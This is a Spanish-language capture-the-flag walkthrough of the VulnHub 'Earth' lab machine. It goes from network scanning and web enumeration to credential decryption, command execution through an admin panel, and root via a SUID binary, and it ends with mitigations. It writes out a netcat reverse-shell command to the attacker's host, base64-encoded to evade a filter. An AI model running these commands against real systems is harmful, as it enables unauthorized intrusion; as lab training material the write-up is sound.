# CTF EARTH LOCAL  
**Objetivo:** Linux 192.168.131.130 (Earth Local)  

 <div style="text-align: center;">
  <img src="https://raw.githubusercontent.com/Zyanetralys/profile/refs/heads/main/planeterath.jpg" width="550" alt="Earth">
</div>

---

## SECUENCIA DE ATAQUE EXPLICADA  

### **FASE 1: PREPARACIÓN**  
```bash
ip a
```
> Verificamos nuestra IP local para identificar la interfaz en uso (eth0).  

```bash
netdiscover -i eth0
```
> Escaneamos la red para encontrar la IP objetivo. Resultado: **192.168.131.130**.  

---

### **FASE 2: RECONOCIMIENTO**  
```bash
sudo nmap -sV -sC -T4 192.168.131.130
```
> Escaneo de servicios y versiones con scripts básicos. Puertos encontrados:  
> - 22/tcp → SSH (OpenSSH 8.6)  
> - 80/tcp → HTTP (Apache 2.4.51)  
> - 443/tcp → HTTPS (Apache 2.4.51 con SSL y certificados para earth.local y terratest.earth.local)  

**Ajuste de /etc/hosts**  
```
192.168.131.130 earth.local terratest.earth.local
```
> Esto permite acceder por nombre de dominio en vez de IP.  

---

### **FASE 3: ENUMERACIÓN WEB**  
```bash
gobuster dir -u http://earth.local/ -w /usr/share/wordlists/dirb/common.txt
```
> Descubrimos `/admin` → Panel de login.  

```bash
gobuster dir -u https://terratest.earth.local/ -k -w /usr/share/wordlists/dirb/common.txt
```
> Detectamos `/robots.txt` que apunta a `/testingnotes.txt`.  

**Contenido notes:**  
- Cifrado usado: XOR  
- Usuario: `terra` (para el panel admin)  
- Archivo `testdata.txt` usado como clave de prueba.  

---

### **FASE 4: OBTENCIÓN CREDENCIALES**  
> Vamos a `testdata.txt` y lo usamos como **KEY** en [CyberChef](https://gchq.github.io/CyberChef/).  
> Método: XOR, salida Hex.  
> Desencriptamos los mensajes ocultos en la página principal de `earth.local`.  

**Resultado:**  
```
Usuario: terra  
Pass: earthclimatechangebad4humans
```

---

### **FASE 5: ACCESO INICIAL**  
> Entramos a `http://earth.local/admin` con credenciales obtenidas.  
> Tenemos un campo de ejecución de comandos como usuario `apache`.  

```bash
whoami
ls /var/earth_web
cat /var/earth_web/user_flag.txt
```
> Obtenemos **FLAG USER**.  

---

### **FASE 6: SHELL REVERSA**  
En máquina atacante:  
```bash
nc -lvnp 4444
```
> Ponemos un listener para recibir la conexión.  

En el panel web:  
```bash
echo 'nc -e /bin/bash 192.168.131.128 4444' | base64
```
> Convertimos el comando a Base64 para evadir el filtro.  

```bash
echo 'bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMTMxLjEyOCA0NDQ0Cg==' | base64 -d | bash
```
> Decodificamos y ejecutamos → conexión establecida.  

Mejoramos la shell:  
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

---

### **FASE 7: ESCALADA DE PRIVILEGIOS**  
```bash
find / -perm -u=s 2>/dev/null
```
> Encontramos binario SUID `/usr/bin/reset_root`.  

- Lo analizamos con `ltrace` → requiere 3 ficheros inexistentes.  
- Creamos los ficheros:  
```bash
touch /dev/shm/kHgTFI5G
touch /dev/shm/Zw7bV9U5
touch /tmp/kcM0Wewe
```
- Ejecutamos de nuevo → contraseña root reseteada a `Earth`.  

```bash
su root
cat /root/root_flag.txt
```
> Obtenemos **FLAG ROOT**.  

---

## RESUMEN VULNERABILIDADES  
- **Credenciales en código fuente cifrado** (XOR)  
- **Panel admin** accesible sin restricciones de IP  
- **Ejecución remota de comandos**  
- **SUID vulnerable** que permite resetear contraseña root  

---

## MEDIDAS DE MITIGACIÓN  
- Eliminar credenciales de código  
- Restringir panel admin por IP  
- Eliminar binarios SUID innecesarios  
- Auditoría de cifrados y backups

---

## EVIDENCIAS  
- FLAG USER: `/var/earth_web/user_flag.txt`  
- FLAG ROOT: `/root/root_flag.txt`  
- Credenciales: `terra / earthclimatechangebad4humans`  
- Archivos clave: `testdata.txt`, `reset_root`

---

##MV
https://www.vulnhub.com/entry/the-planets-earth,755/

---
